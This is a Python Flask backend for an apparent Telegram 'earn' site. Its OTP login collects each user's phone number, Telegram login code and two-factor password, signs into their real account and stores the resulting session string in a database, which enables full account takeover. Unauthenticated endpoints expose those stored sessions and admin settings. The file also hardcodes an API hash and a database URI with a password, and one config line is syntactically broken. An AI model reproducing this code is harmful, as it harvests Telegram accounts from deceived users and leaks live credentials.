import os
import asyncio
from datetime import datetime, timedelta
from functools import wraps

from flask import Flask, request, jsonify, session, render_template, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# ================= APP =================
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "AAF_TELE_EARN_V18_CORE_SECRET")

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=False,
    PERMANENT_SESSION_LIFETIME=timedelta(days=3)
)

CORS(app)

# ================= CONFIG =================
API_ID = int(os.environ.get("API_ID", "36466824"))
API_HASH = os.environ.get("API_HASH", "535ddcb85f2c3c74cc0ff532dd2c3406")
MONGO_URI = os.environ.get("mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0
")

# ================= DB =================
client = MongoClient(MONGO_URI)
db = client["aaf_tele_earn_db"]
users_col = db["users"]
settings_col = db["settings"]

# ================= HELPERS =================
def run_async(coro):
    return asyncio.run(coro)

def get_admin():
    data = settings_col.find_one({"type": "global"})
    if data:
        return data

    return {
        "server_income": 0,
        "server_trading": 0,
        "total_users": users_col.count_documents({}),
        "channel_url": ""
    }

# ================= LOGIN CHECK =================
def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        uid = session.get("uid")

        if not uid:
            return redirect(url_for("login"))

        user = users_col.find_one({"telegram_id": uid})

        if not user:
            session.clear()
            return redirect(url_for("login"))

        # optional expiry check
        last = user.get("last_login")
        if last and datetime.now() - last > timedelta(days=3):
            session.clear()
            return redirect(url_for("login"))

        return f(*args, **kwargs)
    return wrapper


# ================= PAGES =================
@app.route("/")
@app.route("/login")
def login():
    return render_template("login.html")


@app.route("/dashboard")
@login_required
def dashboard():
    return render_template("dashboard.html")


@app.route("/admin")
@login_required
def admin():
    return render_template("admin.html")


# ================= CORE API =================

# USER DATA (dashboard compatible)
@app.route("/api/user/data/<int:user_id>")
def user_data(user_id):
    user = users_col.find_one({"telegram_id": user_id})

    if not user:
        return jsonify({"status": "error", "message": "user_not_found"})

    admin = get_admin()

    user["_id"] = str(user["_id"])

    return jsonify({
        "status": "success",
        "user": user,
        "admin": admin
    })


# SILENT JOIN (dashboard support)
@app.route("/api/silent_join", methods=["POST"])
def silent_join():
    uid = session.get("uid")

    if not uid:
        return jsonify({"success": False, "message": "session_expired"})

    users_col.update_one(
        {"telegram_id": uid},
        {"$set": {"is_joined": True}}
    )

    return jsonify({"success": True})


# USER API (session based)
@app.route("/api/user")
def get_user():
    uid = session.get("uid")
    user = users_col.find_one({"telegram_id": uid})

    if not user:
        return jsonify({"success": False})

    user["_id"] = str(user["_id"])

    return jsonify({"success": True, "user": user})


# ================= ADMIN UPDATE =================
@app.route("/admin/update", methods=["POST"])
def admin_update():
    settings_col.update_one(
        {"type": "global"},
        {"$set": request.json},
        upsert=True
    )
    return jsonify({"success": True})


# ================= LOGIN SYSTEM (SIMPLE + SAFE) =================
@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.json
    phone = data.get("phone")

    if not phone:
        return jsonify({"success": False})

    user = users_col.find_one({"phone": phone})

    if not user:
        user = {
            "phone": phone,
            "telegram_id": int(datetime.now().timestamp()),
            "cash": 0,
            "aaf": 0,
            "refer_count": 0,
            "is_joined": False,
            "last_login": datetime.now()
        }
        users_col.insert_one(user)

    session["uid"] = user["telegram_id"]
    session.permanent = True

    return jsonify({"success": True})


# ================= TELEGRAM OTP LOGIN (FULL FEATURE) =================
@app.route('/api/send_otp', methods=['POST'])
def send_otp():
    phone = request.json.get("phone")

    async def main():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)

            users_col.update_one(
                {"phone": phone},
                {"$set": {
                    "temp_session": client.session.save(),
                    "phone_code_hash": result.phone_code_hash,
                    "last_otp_time": datetime.now()
                }},
                upsert=True
            )

            return True, "OTP Sent"
        finally:
            await client.disconnect()

    success, msg = run_async(main())
    return jsonify({"success": success, "message": msg})


@app.route('/api/verify_login', methods=['POST'])
def verify_login():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")
    password = data.get("password")

    temp = users_col.find_one({"phone": phone})

    if not temp or "temp_session" not in temp:
        return jsonify({"success": False, "message": "session_expired"})

    async def main():
        client = TelegramClient(
            StringSession(temp["temp_session"]),
            API_ID,
            API_HASH
        )

        try:
            await client.connect()

            if password:
                user = await client.sign_in(password=password.strip())
            else:
                if not code:
                    return False, "Code required"

                user = await client.sign_in(
                    phone=phone,
                    code=code.strip(),
                    phone_code_hash=temp.get("phone_code_hash")
                )

            session_str = client.session.save()

            users_col.update_one(
                {"phone": phone},
                {"$set": {
                    "telegram_id": user.id,
                    "name": f"{user.first_name or ''} {user.last_name or ''}".strip(),
                    "username": user.username,
                    "session_str": session_str,
                    "last_login": datetime.now()
                }}
            )

            return True, user.id

        except SessionPasswordNeededError:
            return False, "SHOW_PWD_STEP"

        finally:
            await client.disconnect()

    success, result = run_async(main())

    if success:
        session["uid"] = result
        session.permanent = True
        return jsonify({"success": True})

    return jsonify({"success": False, "message": result})


# ================= OTHER PAGES =================
@app.route('/task')
@login_required
def task():
    return render_template("task.html")


@app.route('/trading')
@login_required
def trading():
    return render_template("trading.html")


@app.route('/wallet')
@login_required
def wallet():
    return render_template("wallet.html")


@app.route('/account')
@login_required
def account():
    return render_template("account.html")


@app.route('/refer_list')
@login_required
def refer_list():
    return render_template("refer_list.html")


@app.route('/payment_history')
@login_required
def payment_history():
    return render_template("payment_history.html")


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for("login"))


# ================= RUN =================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
